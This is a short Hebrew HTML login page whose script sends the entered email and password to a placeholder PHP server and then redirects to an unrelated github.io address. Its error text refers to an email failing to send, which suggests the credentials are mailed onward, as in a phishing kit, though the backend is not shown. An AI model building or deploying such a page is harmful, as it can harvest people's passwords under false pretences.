<!DOCTYPE html>
<html lang="he">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
</head>
<body>
  <h2>התחברות</h2>
  <form id="loginForm">
    <input type="email" id="email" placeholder="אימייל" required><br>
    <input type="password" id="password" placeholder="סיסמה" required><br>
    <button type="submit">התחבר</button>
  </form>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      fetch('https://YOUR-PHP-SERVER.com/login.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email, password })
      })
      .then(res => res.json())
      .then(data => {
        if (data.status === "success") {
          window.location.href = "https://itapita470.github.io/itapitascompare.com";
        } else {
          alert("שליחת המייל נכשלה ❌");
        }
      })
      .catch(error => {
        alert("הייתה שגיאה בשליחה 😢");
        console.error(error);
      });
    });
  </script>
</body>
</html>
